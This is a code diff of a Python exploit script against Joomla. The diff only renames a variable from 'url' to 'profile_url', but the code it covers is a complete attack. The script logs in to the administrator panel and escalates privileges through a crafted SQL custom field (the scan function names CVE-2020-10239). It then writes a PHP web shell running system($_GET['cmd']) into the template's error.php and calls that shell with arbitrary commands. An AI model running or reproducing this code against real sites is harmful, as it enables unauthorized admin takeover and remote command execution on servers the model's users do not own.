@@ -19,10 +19,10 @@ def extract_token(resp):
         return None
     return match.group(1)
 
-def try_admin_login(sess, url, uname, upass):
-    admin_url = url + '/administrator/index.php'
+def try_admin_login(sess, profile_url, uname, upass):
+    admin_profile_url = profile_url + '/administrator/index.php'
     print(f'{Fore.YELLOW}Getting token for Manager login{Style.RESET_ALL}')
-    resp = sess.get(admin_url, verify=False)
+    resp = sess.get(admin_profile_url, verify=False)
     token = extract_token(resp)
     if not token:
         return False
@@ -33,28 +33,28 @@ def try_admin_login(sess, url, uname, upass):
         'task': 'login',
         token: '1'
     }
-    resp = sess.post(admin_url, data=data, verify=False)
+    resp = sess.post(admin_profile_url, data=data, verify=False)
     if 'task=profile.edit' not in resp.text:
         print(f'{Fore.RED}Manager Login Failure!{Style.RESET_ALL}')
         return None
     print(f'{Fore.GREEN}{Style.BRIGHT}Manager Login Successful! Username: {uname}, Password: {upass}{Style.RESET_ALL}')
     return True
 
-def check_admin(sess, url):
-    url_check = url + '/administrator/index.php?option=com_content'
-    resp = sess.get(url_check, verify=False)
+def check_admin(sess, profile_url):
+    profile_url_check = profile_url + '/administrator/index.php?option=com_content'
+    resp = sess.get(profile_url_check, verify=False)
     token = extract_token(resp)
     if not token:
         print(f"{Fore.RED}{Style.BRIGHT}You are not Manager!{Style.RESET_ALL}")
         sys.exit()
     return token
 
-def getManagerId(url, sess):
-    url_get = url + '/administrator/index.php?option=com_admin&view=profile&layout=edit'
-    resp = sess.get(url_get, verify=False)
+def getManagerId(profile_url, sess):
+    profile_url_get = profile_url + '/administrator/index.php?option=com_admin&view=profile&layout=edit'
+    resp = sess.get(profile_url_get, verify=False)
     return re.findall(r'id=\d+', resp.text)
 
-def createNewField(url, sess, token):
+def createNewField(profile_url, sess, token):
     data = {
         'jform[title]': 'SQL query',
         'jform[type]': 'text',
@@ -74,11 +74,11 @@ def createNewField(url, sess, token):
         'task': 'field.apply',
         token: 1
     }
-    resp = sess.post(url + "/administrator/index.php?option=com_fields&context=com_content.article", data=data, verify=False)
+    resp = sess.post(profile_url + "/administrator/index.php?option=com_fields&context=com_content.article", data=data, verify=False)
     id = re.findall(r'id=\d+', resp.text)
-    id_account = getManagerId(url, sess)
+    id_account = getManagerId(profile_url, sess)
     ran = '%d' % random.randrange(1, 10000)
-    url_post = url + '/administrator/index.php?option=com_fields&context=com_content.article&layout=edit&' + id[0]
+    profile_url_post = profile_url + '/administrator/index.php?option=com_fields&context=com_content.article&layout=edit&' + id[0]
     newdata = {
         'jform[title]': 'SQL query ' + ran,
         'jform[type]': 'sql',
@@ -100,14 +100,14 @@ def createNewField(url, sess, token):
         token: 1
     }
     newdata['task'] = 'field.apply'
-    sess.post(url_post, data=newdata, verify=False)
-    url_sql = url + '/administrator/index.php?option=com_content&view=article&layout=edit'
-    sess.get(url_sql, verify=False)
+    sess.post(profile_url_post, data=newdata, verify=False)
+    profile_url_sql = profile_url + '/administrator/index.php?option=com_content&view=article&layout=edit'
+    sess.get(profile_url_sql, verify=False)
 
-def checkSuperAdmin(url, sess):
+def checkSuperAdmin(profile_url, sess):
     print(f"{Fore.YELLOW}Checking Super-admin{Style.RESET_ALL}")
-    url_config = url + '/administrator/index.php?option=com_config'
-    resp = sess.get(url_config, verify=False)
+    profile_url_config = profile_url + '/administrator/index.php?option=com_config'
+    resp = sess.get(profile_url_config, verify=False)
     results = re.findall(r'name="([^"]+)"\s+[^>]*?value="([^"]+)"', resp.text, re.S)
     if not results:
         print(f"{Fore.RED}{Style.BRIGHT}You are not super-admin!{Style.RESET_ALL}")
@@ -116,9 +116,9 @@ def checkSuperAdmin(url, sess):
         print(f"{Fore.GREEN}{Style.BRIGHT}You are now Super-admin!{Style.RESET_ALL}")
         return True
 
-def rce(sess, url, cmd, token):
+def rce(sess, profile_url, cmd, token):
     filename = 'error.php'
-    shlink = url + '/administrator/index.php?option=com_templates&view=template&id=506&file=506&file=L2Vycm9yLnBocA%3D%3D'
+    shlink = profile_url + '/administrator/index.php?option=com_templates&view=template&id=506&file=506&file=L2Vycm9yLnBocA%3D%3D'
     shdata_up = {
         'jform[source]': "<?php echo 'Hacked by HK\n' ;system($_GET['cmd']); ?>",
         'task': 'template.apply',
@@ -129,9 +129,9 @@ def rce(sess, url, cmd, token):
     sess.post(shlink, data=shdata_up)
     path2shell = '/templates/protostar/error.php?cmd=' + cmd
     print(f'{Fore.GREEN}Checking shell:{Style.RESET_ALL}')
-    shreq = sess.get(url + path2shell)
+    shreq = sess.get(profile_url + path2shell)
     shresp = shreq.text
-    print(shresp + f'{Fore.GREEN}Shell link: \n' + (url + path2shell) + f'{Style.RESET_ALL}')
+    print(shresp + f'{Fore.GREEN}Shell link: \n' + (profile_url + path2shell) + f'{Style.RESET_ALL}')
     print(f'{Fore.GREEN}{Style.BRIGHT}Module finished.{Style.RESET_ALL}')
 
 def scan_cve_2020_10239(target):
